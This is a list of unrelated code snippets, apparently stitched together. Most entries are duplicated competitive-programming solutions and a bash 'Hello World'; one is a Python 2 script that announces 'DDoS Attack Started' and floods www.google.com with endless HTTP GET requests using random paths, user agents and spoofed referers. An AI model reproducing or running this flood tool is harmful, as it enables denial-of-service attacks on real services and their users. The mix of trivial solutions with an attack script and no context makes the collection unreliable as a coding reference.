["\ndef main():\n    n = int(input())\n    a = list(map(int, input().split()))\n\n    # The number of elements that need to be replaced is the number of elements that are different from the first element.\n    print(n - a.count(a[0])) \n\n\nif __name__ == '__main__':\n    main()\n", "\nn = int(input())\nv = list(map(int, input().split()))\n\na = [0] * (10 ** 5 + 1)\nfor i in v:\n    a[i] += 1\n\na.sort()\n\nans = 0\nif a[-1] == a[-2]:\n    ans = 0\nelse:\n    ans = a[-1] - a[-2]\n\nprint(ans)\n", "\ndef main():\n    n = int(input())\n    a = list(map(int, input().split()))  # a = [int(input()) for i in range(n)]\n\n    # The number of elements that need to be replaced is the number of elements\n    # that are different from the first element.\n    print(n - a.count(a[0]))\n\n\nif __name__ == '__main__':\n    main()\n", "import sys\n\nn = int(sys.stdin.readline())\nv = list(map(int, input().split()))\n\na = [0] * (10 ** 5 + 1)\nfor i in v:\n    a[i] += 1\n\na.sort()\n\nans = 0\nif a[-1] == a[-2]:\n    ans = 0\nelse:\n    ans = a[-1] - a[-2]\n\nprint(ans)\n", "#!/bin/bash\n\n# this program simply prints out the message \"Hello World\"\n\necho \"Hello World\"\n", "#!/usr/bin/python\nimport os\nimport sys\nimport time\nimport socket\nimport httplib\nimport random\n\n\n\n\n\ndef print_status(message):\n    sys.stdout.write('\\r\\x1b[K'+message)\n    sys.stdout.flush()\n\ndef print_line():\n    sys.stdout.write('\\n')\n    sys.stdout.flush()\n\n\ndef get_random_ip():\n    random.seed()\n    not_valid = [10,127,169,172,192]\n    first = random.randint(1,255)\n    while first in not_valid:\n        first = random.randint(1,255)\n    ip = \".\".join([str(first),str(random.randint(1,255)),str(random.randint(1,255)),str(random.randint(1,255))])\n    return ip\n\n\ndef get_random_agent():\n    agents = []\n    agents.append(\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\")\n    agents.append(\"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0\")\n    agents.append(\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\")\n    agents.append(\"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\")\n    agents.append(\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36\")\n    agents.append(\"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\")\n    return agents[random.randint(0, len(agents)-1)]\n\ndef get_random_referer():\n    referers = []\n    referers.append(\"http://www.google.com/?q=\")\n    referers.append(\"http://www.usatoday.com/search/results?q=\")\n    referers.append(\"http://engadget.search.aol.com/search?q=\")\n    referers.append(\"http://www.google.co.uk/?q=\")\n    referers.append(\"http://www.google.com.br/?q=\")\n    referers.append(\"http://www.google.fr/?q=\")\n    referers.append(\"http://www.google.it/?q=\")\n    referers.append(\"http://www.google.ru/?q=\")\n    referers.append(\"http://www.google.es/?q=\")\n    referers.append(\"http://www.google.com.mx/?q=\")\n    referers.append(\"http://www.google.ca/?q=\")\n    referers.append(\"http://www.google.com.au/?q=\")\n    referers.append(\"http://www.google.com.tr/?q=\")\n    referers.append(\"http://www.google.co.jp/?q=\")\n    referers.append(\"http://www.google.com.hk/?q=\")\n    referers.append(\"http://www.google.co.in/?q=\")\n    referers.append(\"http://www.google.com.pk/?q=\")\n    referers.append(\"http://www.google.com.ng/?q=\")\n    referers.append(\"http://www.google.com.ar/?q=\")\n    referers.append(\"http://www.google.nl/?q=\")\n    referers.append(\"http://www.google.be/?q=\")\n    referers.append(\"http://www.google.de/?q=\")\n    referers.append(\"http://www.google.at/?q=\")\n    referers.append(\"http://www.google.ch/?q=\")\n    referers.append(\"http://www.google.pl/?q=\")\n    referers.append(\"http://www.google.pt/?q=\")\n    referers.append(\"http://www.google.ba/?q=\")\n    referers.append(\"http://www.google.rs/?q=\")\n    referers.append(\"http://www.google.co.za/?q=\")\n    referers.append(\"http://www.google.co.ke/?q=\")\n    referers.append(\"http://www.google.co.il/?q=\")\n    referers.append(\"http://www.google.com.eg/?q=\")\n    referers.append(\"http://www.google.co.ve/?q=\")\n    referers.append(\"http://www.google.co.id/?q=\")\n    referers.append(\"http://www.google.com.ua/?q=\")\n    referers.append(\"http://www.google.co.th/?q=\")\n    referers.append(\"http://www.google.co.nz/?q=\")\n    referers.append(\"http://www.google.lv/?q=\")\n    referers.append(\"http://www.google.lt/?q=\")\n    referers.append(\"http://www.google.ee/?q=\")\n    return referers[random.randint(0, len(referers)-1)]\n\ndef get_random_string(length):\n    letters = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    return ''.join(random.choice(letters) for i in range(length))\n\n\n\ndef main():\n    print \"DDoS Attack Started\"\n    print \"Press Ctrl+C to stop\"\n    print \"\"\n    print_status(\"Initializing\")\n    time.sleep(2)\n    print_status(\"Initialized\")\n    time.sleep(2)\n    print_status(\"DDoS Attack Started\")\n    print \"\"\n    while True:\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.connect((\"www.google.com\", 80))\n            s.send(\"GET /\" + get_random_string(random.randint(4,10)) + \" HTTP/1.1\\r\\n\")\n            s.send(\"Host: \" + \"www.google.com\" + \"\\r\\n\")\n            s.send(\"User-Agent: \" + get_random_agent() + \"\\r\\n\")\n            s.send(\"Accept-language: en-US,en,q=0.5\\r\\n\")\n            s.send(\"Referer: \" + get_random_referer() + get_random_string(random.randint(5,10)) + \"\\r\\n\")\n            s.send(\"\\r\\n\")\n            s.close()\n        except socket.error:\n            s.close()\n            time.sleep(.1)\n\nif __name__ == \"__main__\":\n    main()\n", "def main():\n    n = int(input())\n    a = list(map(int, input().split()))\n\n    # The number of elements that need to be replaced is the number of elements\n    # that are different from the first element.\n    print(n - a.count(a[0]))\n\n\nif __name__ == '__main__':\n    main()\n", "\"file.py\" \n"]